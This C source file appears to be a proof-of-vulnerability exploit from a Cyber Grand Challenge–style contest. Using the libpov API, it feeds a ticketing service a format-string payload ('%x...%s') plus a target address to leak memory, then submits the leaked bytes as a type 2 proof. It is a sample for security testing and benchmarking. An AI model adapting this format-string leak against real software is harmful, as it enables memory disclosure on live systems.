#include <libpov.h>
#include "xlat.h"

#define EOL "\n"
#define COMMAND_DELIM "|"

void write_string(char* s)
{
  transmit_all(STDOUT, s, strlen(s));
}

int main(void)
{
    type2_vals t2;
    type2_negotiate(&t2);

    xlat_seed("EREH_EULAV_MODNAR");

    write_string("HIRE" COMMAND_DELIM "05" COMMAND_DELIM COMMAND_DELIM);
    write_string("HIRE" COMMAND_DELIM "05" COMMAND_DELIM COMMAND_DELIM);
    write_string("HIRE" COMMAND_DELIM "05" COMMAND_DELIM COMMAND_DELIM);
    write_string("HIRE" COMMAND_DELIM "05" COMMAND_DELIM COMMAND_DELIM);
    char* bad_desc1 = "A";
    char* bad_desc2 = "GHI%x%x%x%x%x%x%x%x%x%x%x%s";

    int off = 0;
    unsigned char* buf;
    unsigned int bufsz;
    for (size_t i = 0; i < 16; i++)
    {
      off += 11;
      write_string("ADD_TICKET" COMMAND_DELIM "john" COMMAND_DELIM);
      write_string(bad_desc1);
      int x = t2.region_addr + off;
      transmit_all(STDOUT, &x, 4);
      write_string(bad_desc2);
      write_string(COMMAND_DELIM "05" COMMAND_DELIM COMMAND_DELIM);

      for (size_t i = 0; i < 110; i++)
      {
        write_string("VIEW" COMMAND_DELIM "02" COMMAND_DELIM COMMAND_DELIM);
      }

      transmit_all(STDERR, "\nA\n", 3);
      delimited_read(STDIN, &buf, &bufsz, (unsigned char*)("Ticket Finished" EOL), strlen("Ticket Finished" EOL));
      transmit_all(STDERR, "B\n", 2);
      delimited_read(STDIN, &buf, &bufsz, (unsigned char*)("OK" EOL), strlen("OK" EOL));
      transmit_all(STDERR, "C\n", 2);
      transmit_all(STDERR, buf, bufsz);
      if (bufsz > 80)
        break;
    }

      type2_submit(buf + 70, 4);
      write_string("QUIT" COMMAND_DELIM COMMAND_DELIM);
      return 0;
}
